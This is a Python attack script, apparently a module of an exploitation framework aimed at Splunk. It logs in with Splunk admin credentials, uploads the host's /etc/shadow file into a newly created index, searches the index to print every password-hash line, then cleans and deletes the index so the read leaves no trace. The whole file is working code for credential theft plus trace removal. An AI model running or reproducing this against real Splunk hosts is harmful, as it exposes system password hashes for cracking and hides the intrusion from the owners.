#!/usr/bin/env python3

# In Linux installations read /etc/shadow file
# from the host where Splunk is installed

# %%%%%%%%%%% Libraries %%%%%%%%%%%#

import sys
import getpass
import globals
import splunklib.client as client

sys.path.append('../')

# %%%%%%%%%%%% Constants %%%%%%%%%%%%%#

SEPARATOR = "[*] {0} [*]".format('=' * 110)

# %%%%%%%%%%% Functions %%%%%%%%%%%#


def read_file(ip, port):

	splunk_admin = input("[!] Enter Splunk Admin (Default admin): ")
	splunk_password = getpass.getpass("[!] Enter Splunk Password: ")
	splunk_service = client.connect(
		host=ip, port=port,
		username=splunk_admin, password=splunk_password)
	name = "siemsfworkidx"

	if name not in splunk_service.indexes:
		siemsfworkidx = splunk_service.indexes.create("siemsfworkidx")
	else:
		siemsfworkidx = splunk_service.indexes[name]

	# Splunk can be installed on debian, centos, ubuntu and redhat,
	# the shadow file is /etc/shadow

	uploadfile = "/etc/shadow"
	siemsfworkidx.upload(uploadfile)

	globals.splunk_messages(9)

	# the file is uploaded in the index siemsfworkidx,
	# the count=0 is for returning all events

	searchquery_oneshot = "search index = siemsfworkidx | stats list(_raw)"
	kwargs_oneshot = {"output_mode": "csv", "count": 0}
	oneshotsearch_results = splunk_service.jobs.oneshot(
		searchquery_oneshot, **kwargs_oneshot)
	results = str(oneshotsearch_results.read())
	data = results.replace('"', '')
	data2 = data.replace('list(_raw)', '')
	shadow = data2.split(' ')

	for i in shadow:
		if not i.startswith('\n'):
			print("[*] " + i)
		else:
			print("[*] " + i.replace('\n', ''))

	print(SEPARATOR)
	print(
		"[!] Please wait a few seconds for the index to be cleaned and deleted [!]")

	timeout = 60
	siemsfworkidx.clean(timeout)
	siemsfworkidx.delete()

# %%%%%%%%%% The End %%%%%%%%%%#
